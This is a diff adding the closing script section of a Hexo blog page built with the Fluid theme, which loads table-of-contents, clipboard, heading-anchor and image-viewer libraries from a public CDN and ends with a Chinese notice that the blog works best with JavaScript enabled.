+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
